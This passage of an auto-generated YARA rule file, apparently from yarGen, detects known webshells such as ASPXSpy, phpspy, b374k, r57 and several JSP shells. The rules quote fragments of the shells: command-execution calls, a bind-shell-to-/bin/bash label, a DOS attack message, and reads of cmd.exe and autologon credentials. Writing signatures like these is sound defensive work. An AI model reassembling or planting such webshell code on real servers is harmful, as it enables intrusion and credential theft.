      $s6 = "Dim TempFolderList,t:t=0" fullword ascii
      $s7 = "GetTheSizes=num&\" \"&arySize(i)" fullword ascii
      $s8 = " Private Function ColorOn(FileName)" fullword ascii
      $s9 = "  Set objFd=objFso.GetFolder(Folder)" fullword ascii
      $s10 = " Set OFolder = FSO.GetFolder(folder)" fullword ascii
      $s11 = "Function GetTheSizes(num)" fullword ascii
      $s12 = "while (DStart + 10) < DEnd" fullword ascii
      $s13 = "Err.Clear:Response.Flush" fullword ascii
      $s14 = "hexstr = Hex(AscB(MidB(binstr, i, 1)))" fullword ascii
      $s15 = "Function bin2hex(binstr)" fullword ascii
      $s16 = "TFL.FileStart =DIEnd" fullword ascii
      $s17 = "For i = 1 To LenB(binstr)" fullword ascii
      $s18 = ":\"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),\"pass\")" fullword ascii
      $s19 = ":\"&PcAnywhere (Mid(bin2hex(BinStr),919,64),\"user\")" fullword ascii
      $s20 = "Function upload()" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _ASPXspy2_aspx_95 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
   strings:
      $x1 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $x2 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
      $x3 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
      $x4 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
      $x5 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
      $s6 = "<asp:LinkButton ID=\"UtkN\" runat=\"server\" OnClick=\"YKpI\" Text=\"Logout\" ></asp:LinkButton> | <asp:LinkButton ID=\"RsqhW\" " ascii
      $s7 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownLis" ascii
      $s8 = "oft.Jet.OLEDB.4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID=\"QcZPA\" runat=\"server" ascii
      $s9 = "ZGKh.Text=\"<a href=\\\"javascript:if(confirm('Are you sure will delete it ?\\\\n\\\\nIf non-empty directory,will be delete all " ascii
      $s10 = "Bin_H2_Title.InnerText=\"Serv-U Exec >>\";" fullword ascii
      $s11 = " /c net user\"/> <asp:Button ID=\"SPhc\" CssClass=\"bt\" runat=\"server\" Text=\"Exploit\" OnClick=\"lRfRj\"/></td>" fullword ascii
      $s12 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//admin" fullword ascii
      $s13 = "<td style=\"width:20%\" align=\"left\"><asp:DropDownList runat=\"server\" ID=\"Ven\" AutoPostBack=\"False\" CssClass=\"list\"><a" ascii
      $s14 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
      $s15 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> Port : <" ascii
      $s16 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">Down</a> | <a href='" ascii
      $s17 = " ID=\"OREpx\" runat=\"server\" Text=\"Process\" OnClick=\"Grxk\"></asp:LinkButton> | <asp:LinkButton ID=\"jHN\" runat=\"server\"" ascii
      $s18 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">Down</a> | <a href='" ascii
      $s19 = "Value=\"name\">File Name</asp:ListItem><asp:ListItem Value=\"content\" Selected=\"True\">File Content</asp:ListItem></asp:DropDo" ascii
      $s20 = "ZGKh.Text=\"<a href=\\\"javascript:if(confirm('Are you sure will delete it ?\\\\n\\\\nIf non-empty directory,will be delete all " ascii
   condition:
      ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_PHPSPY_phpspy_2005_lite_96 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, PHPSPY.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
      hash3 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
      $s2 = "<option value=\"shell_exec\" <? if ($execfunc==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>" fullword ascii
      $s3 = "  <form action=\"?action=shell&dir=<?=urlencode($dir)?>\" method=\"POST\">" fullword ascii
      $s4 = "$adminpass=trim($_POST['adminpass']);" fullword ascii
      $s5 = "$dbpassword = isset($dbpassword) ? $dbpassword : '';" fullword ascii
      $s6 = "<option value=\"exec\" <? if ($execfunc==\"exec\") { echo \"selected\"; } ?>>exec</option>" fullword ascii
      $s7 = "<option value=\"popen\" <? if ($execfunc==\"popen\") { echo \"selected\"; } ?>>popen</option>" fullword ascii
      $s8 = "<option value=\"system\" <? if ($execfunc==\"system\") { echo \"selected\"; } ?>>system</option>" fullword ascii
      $s9 = "$dbusername = isset($dbusername) ? $dbusername : 'root';" fullword ascii
      $s10 = "if ( function_exists('ini_get') ) {" fullword ascii
      $s11 = "  <form action=\"?action=sql\" method=\"POST\">" fullword ascii
      $s12 = "$onoff = get_cfg_var('register_globals');" fullword ascii
      $s13 = "if (!get_cfg_var(\"safe_mode\")) {" fullword ascii
      $s14 = "$onoff = ini_get('register_globals');" fullword ascii
      $s15 = " <form action=\"?action=phpenv\" method=\"POST\">" fullword ascii
      $s16 = "  <form action=\"?action=editfile&dir=<?=urlencode($dir)?>\" method=\"POST\">" fullword ascii
      $s17 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadmyfile']['name'].\"\") ? \"" fullword ascii
      $s18 = "  <form action=\"?dir=<?=urlencode($dir)?>\" method=\"POST\">" fullword ascii
      $s19 = " <form action=\"\" method=\"GET\">" fullword ascii
      $s20 = " <form action=\"?dir=<?=urlencode($dir)?>\" method=\"POST\" enctype=\"multipart/form-data\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_2_7_source_97 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash3 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash4 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash5 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s2 = "setcookie(\"b374k_included\", \"1\" ,time() + $s_login_time);" fullword ascii
      $s3 = "setcookie(\"s_self\", $s_self ,time() + $s_login_time);" fullword ascii
      $s4 = "setcookie(\"s_home\", $s_home ,time() + $s_login_time);" fullword ascii
      $s5 = "<input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />" fullword ascii
      $s6 = "this.value = this.value.substring(0,this.selectionStart) + \"\\t\" + this.value.substring(this.selectionEnd);" fullword ascii
      $s7 = "<tr><td style='width:170px;'>DSN / Connection String</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost" ascii
      $s8 = "<tr><td style='width:170px;'>DSN / Connection String</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost" ascii
      $s9 = "<noscript><input class='inputzbut' type='submit' value='Go !' name='submitcmd' style='width:80px;' /></noscript>" fullword ascii
      $s10 = "// get array of all files from given directory" fullword ascii
      $s11 = "$s_result .= \"<form action='\".$s_self.\"' method='post'>" fullword ascii
      $s12 = "<form action='\".$s_self.\"' method='post' style='margin:0;padding:0;'>" fullword ascii
      $s13 = "<form action='<?php echo $s_self; ?>' method='post'>" fullword ascii
      $s14 = "<form action='\".$s_self.\"' method='post'>" fullword ascii
      $s15 = "var textareas = d.getElementsByTagName('textarea');" fullword ascii
      $s16 = "<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>" fullword ascii
      $s17 = "&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class='gaya'>[</span> ; <span class='gaya'>]</span></p>" fullword ascii
      $s18 = "$s_info  = \"<table class='headtbl'><tr><td>\".$s_system.\"</td></tr>\";" fullword ascii
      $s19 = "if(isset($_COOKIE['b374k_included'])){" fullword ascii
      $s20 = "elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _ha_ma1_98 {
   meta:
      description = "webshell - from files ha.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash2 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
      $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
      $s3 = "sRet += \" <td width=\\\"15%\\\" align=\\\"center\\\">\" + (files[n].isDirectory() ? \"&lt;dir&gt;\" : \"\") + ((! files[n].isDi" ascii
      $s4 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
      $s5 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
      $s6 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
      $s7 = "isTextFile(getExtName(files[n].getPath())) ? \"<<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"&f" ascii
      $s8 = "sRet += \" <td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getNam" ascii
      $s9 = "sRet += \" <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
      $s10 = "sRet += \" document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + " ascii
      $s11 = "sRet += \" <td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathCo" ascii
      $s12 = "sRet += \" <td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getNam" ascii
      $s13 = "sRet += \" <td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getNam" ascii
      $s14 = "+ pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
      $s15 = "sRet += \" <td><a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(files[n].getPath()) + \"\\\" title=\\\"\" + files[n].getNam" ascii
      $s16 = "t;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
      $s17 = "sRet += \" document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + " ascii
      $s18 = "sRet += \" <form name=\\\"openfile\\\" method=\\\"post\\\" action=\\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=save\" + " ascii
      $s19 = "sRet += \" <form name=\\\"fileList\\\" method=\\\"post\\\" action=\\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=deleteFil" ascii
      $s20 = "sRet += \" <td width=\\\"5%\\\" align=\\\"center\\\"><input type=\\\"checkbox\\\" name=\\\"filesDelete\\\" value=\\\"\" + pathCo" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ani_Shell_v4xGus6X_99 {
   meta:
      description = "webshell - from files Ani-Shell.php, v4xGus6X.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
   strings:
      $s1 = "        $output = shell_exec($command);" fullword ascii
      $s2 = "function exec_all($command)" fullword ascii
      $s3 = "else if(isset($_GET['injector']))" fullword ascii
      $s4 = "        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'" fullword ascii
      $s5 = "// Code Injector" fullword ascii
      $s6 = "        exec($command,$output);" fullword ascii
      $s7 = "        $handle = popen($command , \"r\"); // Open the command pipe for reading" fullword ascii
      $s8 = "                    $output .= fgets($pipes[1],512);" fullword ascii
      $s9 = "else if(isset($_GET['mail']))" fullword ascii
      $s10 = "else if(isset($_GET['dos']))" fullword ascii
      $s11 = "function getDisabledFunctions()" fullword ascii
      $s12 = "else if(isset($_GET['rename']))" fullword ascii
      $s13 = "        echo \"DOS attack against $mode://$IP:$port completed on \".date(\"h:i:s A\").\"<br />\";" fullword ascii
      $s14 = "else if(isset($_GET['open']))" fullword ascii
      $s15 = "else if(isset($_GET['fuzz']))" fullword ascii
      $s16 = "else if(isset($_GET['bomb']))" fullword ascii
      $s17 = "function getFilePermissions($file)" fullword ascii
      $s18 = "        $output = ob_get_contents();    // Get the ouput " fullword ascii
      $s19 = "    else if(function_exists('shell_exec'))" fullword ascii
      $s20 = "                    $output .= fread($pipes[1], 512);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57_Mohajer22_r57_kartal_r57_r57_iFX_100 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash6 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "'eng_text41'=>'Save dump in file'," fullword ascii
      $s2 = "'eng_text37'=>'Login'," fullword ascii
      $s3 = "'eng_text9' =>'Bind port to /bin/bash'," fullword ascii
      $s4 = "'eng_text40'=>'Dump database table'," fullword ascii
      $s5 = "'eng_butt9' =>'Dump'," fullword ascii
      $s6 = "'eng_text24'=>'Remote host'," fullword ascii
      $s7 = "'eng_text68'=>'Command'," fullword ascii
      $s8 = "'eng_text38'=>'Password'," fullword ascii
      $s9 = "'eng_text48'=>'Delete temp files'," fullword ascii
      $s10 = "'eng_text49'=>'Delete script from server'," fullword ascii
      $s11 = "'eng_text15'=>'Upload files from remote server'," fullword ascii
      $s12 = "'eng_butt3' =>'Bind'," fullword ascii
      $s13 = "'eng_text83'=>'Run SQL query'," fullword ascii
      $s14 = "'eng_text10'=>'Port'," fullword ascii
      $s15 = "'eng_butt5' =>'Run'," fullword ascii
      $s16 = "'eng_text47'=>'Show variables from php.ini'," fullword ascii
      $s17 = "  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center" ascii
      $s18 = "'eng_text17'=>'Remote file'," fullword ascii
      $s19 = "'eng_text14'=>'Port'," fullword ascii
      $s20 = "      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_NEW_WebShell__1__4_0__1__NEW_WebShell__1___2014_10_23_14_54_16__101 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, NEW WebShell (1).asp, 4.0 (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, _2012.asp, NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash6 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash7 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash8 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s2 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s3 = "txen emuser rorre no" fullword ascii /* reversed goodware string 'on error resume next' */
      $s4 = "txeN emuseR rorrE nO" fullword ascii /* reversed goodware string 'On Error Resume Next' */
      $s5 = "exe.dmc" fullword ascii /* reversed goodware string 'cmd.exe' */
      $s6 = "drowssaPtluafeD" fullword ascii /* reversed goodware string 'DefaultPassword' */
      $s7 = "ERAWTFOS_REVRES" fullword ascii /* reversed goodware string 'SERVER_SOFTWARE' */
      $s8 = "nehT rrE fI" fullword ascii /* reversed goodware string 'If Err Then' */
      $s9 = "rebmuNtroP" fullword ascii /* reversed goodware string 'PortNumber' */
      $s10 = "emaNresUtluafeD" fullword ascii /* reversed goodware string 'DefaultUserName' */
      $s11 = "maerts-tetco/noitacilppa" fullword ascii /* reversed goodware string 'application/octet-stream' */
      $s12 = ">der=roloc tnof<" fullword ascii /* reversed goodware string '<font color=red>' */
      $s13 = "htaPeht" fullword ascii /* reversed goodware string 'thePath' */
      $s14 = ") 1 - xkees ,)i(pmt(tfeL = Ntrats" fullword ascii
      $s15 = "tcejbOmetsySeliF.gnitpircS" fullword ascii
      $s16 = "llehS.tpircSW" fullword ascii
      $s17 = ") xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne" fullword ascii
      $s18 = ":1.0.0.721//:ptth" fullword ascii /* reversed goodware string 'http://127.0.0.1:' */
      $s19 = ")yeKssaPnigoLotua & htaPnigoLotua(daeRgeR.Xsw = drowssaPnigoLotua" fullword ascii
      $s20 = "=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_2_7_source_102 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash4 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "var q = d.getElementById('dump_'+t);" fullword ascii
      $s2 = "var s = d.getElementById('dump_'+t);" fullword ascii
      $s3 = "var a = d.getElementsByName('hexdump');" fullword ascii
      $s4 = "var buff = d.getElementById('cmd');" fullword ascii
      $s5 = "if(d.getElementById(l + '_')) d.getElementById(l + '_').focus();" fullword ascii
      $s6 = "<option value='' disabled selected>Download</option>" fullword ascii
      $s7 = "var s = d.getElementById('hex_'+(parseInt(t)+1));" fullword ascii
      $s8 = "var z = d.getElementById('type');" fullword ascii
      $s9 = "if(d.getElementById(b)){" fullword ascii
      $s10 = "function getcurpos(c){" fullword ascii
      $s11 = "var curpos = getcurpos(r);" fullword ascii
      $s12 = "else d.getElementById(b).style.display = 'block'" fullword ascii
      $s13 = "var hexestxtarea = d.getElementById('hexestxtarea');" fullword ascii
      $s14 = "if(d.getElementById(b).style.display == 'block') d.getElementById(b).style.display = 'none';" fullword ascii
      $s15 = "var r = d.getElementById('hex_'+t);" fullword ascii
      $s16 = "if(d.getElementById(l)) d.getElementById(l).style.display = 'none';" fullword ascii
      $s17 = "var hex = d.getElementById('hex_'+i);" fullword ascii
      $s18 = "var s = d.getElementById('hex_'+(parseInt(t)-1));" fullword ascii
      $s19 = "if(d.getElementById(b)) d.getElementById(b).style.display = 'block';" fullword ascii
      $s20 = "var a = d.getElementById('additionaloption');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell_SnIpEr_SA_Shell_r57_r57_iFX_103 {
   meta:
      description = "webshell - from files r57shell.php, SnIpEr_SA Shell.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash4 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "?? ?????? ??? GID (??????) \\r\\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)\"," fullword ascii
      $s2 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s3 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s4 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword ascii
      $s5 = "'ru_text75'=>'* ????? ???????????? ?????????? ?????????'," fullword ascii
      $s6 = "'ru_text47'=>'???????? ???????? php.ini'," fullword ascii
      $s7 = "'ru_text28'=>'?????? ? safe_mode'," fullword ascii
      $s8 = "'ru_text83'=>'?????????? SQL ???????'," fullword ascii
      $s9 = "'ru_text54'=>'????? ?????? ? ??????'," fullword ascii
      $s10 = "'ru_text18'=>'????????? ????'," fullword ascii
      $s11 = "'ru_text31'=>'???? ?? ??????'," fullword ascii
      $s12 = "'ru_butt8' =>'?????????'," fullword ascii
      $s13 = "'ru_text56'=>'?????? ?? ???????'," fullword ascii
      $s14 = "'ru_text10'=>'??????? ????'," fullword ascii
      $s15 = "'ru_text1' =>'??????????? ???????'," fullword ascii
      $s16 = "'ru_text43'=>'????????????? ????'," fullword ascii
      $s17 = "'ru_text80'=>'???'," fullword ascii
      $s18 = "'ru_text3' =>'????????? ???????'," fullword ascii
      $s19 = "'ru_text16'=>'????????????'," fullword ascii
      $s20 = "'ru_butt10'=>'?????????'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _in_Browser_download_warn_ma_leo_devshell_jfolder01_jsp_File_browser_3_JFolder_shell1_webshell_nc_jsp_400_104 {
   meta:
      description = "webshell - from files in.jsp, Browser.jsp, download.jsp, warn.jsp, ma.jsp, leo.jsp, devshell.jsp, jfolder01.jsp, jsp_File_browser.jsp, 3.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash3 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash4 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash5 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
      hash8 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash9 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash10 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
      hash11 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash12 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash13 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash14 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash15 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s2 = "String bound = request.getContentType().substring(bstart + 8);" fullword ascii
      $s3 = "stLine.nextToken(); // Content-Type" fullword ascii
      $s4 = "os.write(previousLine, 0, read - 2);" fullword ascii
      $s5 = "System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);" fullword ascii
      $s6 = "fileInfo.fileContentType = stLine.nextToken();" fullword ascii
      $s7 = "int clength = request.getContentLength();" fullword ascii
      $s8 = "int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
      $s9 = "while (readingContent) {" fullword ascii
      $s10 = "public void setFileContents(byte[] aByteArray) {" fullword ascii
      $s11 = "boolean readingContent = true;" fullword ascii
      $s12 = "fileInfo.setFileContents(baos.toByteArray());" fullword ascii
      $s13 = "private byte[] fileContents = null;" fullword ascii
      $s14 = "private final int ONE_MB = 1024 * 1;" fullword ascii
      $s15 = "temp = currentLine;" fullword ascii
      $s16 = "byte temp[] = null;" fullword ascii
      $s17 = "previousLine = temp;" fullword ascii
      $s18 = "if (read != -1) {" fullword ascii
      $s19 = "stFields.nextToken();" fullword ascii
      $s20 = "dataTable.put(paramName, fileInfo);" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _icesword_job_ma4_ha_2_520_ma1_105 {
   meta:
      description = "webshell - from files icesword.jsp, job.jsp, ma4.jsp, ha.jsp, 2.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
